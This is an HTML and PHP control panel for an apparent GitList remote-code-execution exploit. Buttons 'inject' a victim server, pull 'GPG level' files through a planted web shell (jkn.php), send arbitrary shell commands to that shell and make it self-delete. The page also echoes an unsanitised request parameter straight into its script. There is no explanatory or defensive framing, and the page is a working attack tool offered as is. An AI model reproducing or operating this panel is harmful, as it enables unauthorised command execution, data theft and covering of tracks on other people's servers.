<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<HEAD>
		<SCRIPT language="JavaScript" type="text/javascript">
			var ip='<?php echo $_REQUEST['ip'];?>';

			function injectVictim() {
				var url='gitlist-rce-inyect.php?ip=' + ip;
				document.getElementById('commandiframe').src=url;
				return true;

			}

			function exploitGitListRCECommand() {
				var command=document.getElementById('gitlistRCECommand').value;
				var url='http://' + ip + '/gitlist/cache/jkn.php?cmd=' + command;
				document.getElementById('commandiframe').src=url;
				return true;
			}

			function checkKey(e) {
				if (e.keyCode == 13) {
					exploitGitListRCECommand();
					return false;
				}
				return true;
			}

			function downloadLevel(level) {
				var url='http://' + ip + '/gitlist/cache/jkn.php?level=' + level;
				document.getElementById('commandiframe').src=url;
				return true;
			}
		</SCRIPT>
</HEAD>
<BODY>
	<button OnClick="injectVictim()">Inject victim server</button>
	<HR />
	<button OnClick="downloadLevel(1)">Download GPG level 1</button>
	<button OnClick="downloadLevel(2)">Download GPG level 2</button>
	<button OnClick="downloadLevel(3)">Download GPG level 3</button>
	<HR />
	<button OnClick="downloadLevel(0)">Self delete</button>
	<HR />
	<INPUT type="text" id="gitlistRCECommand" OnKeyPress="checkKey(event)" value="ls -la"><button OnClick="exploitGitListRCECommand()">Send</button><BR />
	<IFRAME id="commandiframe" src="about:blank" width="100%" height="400"></IFRAME>
</BODY>
</HTML>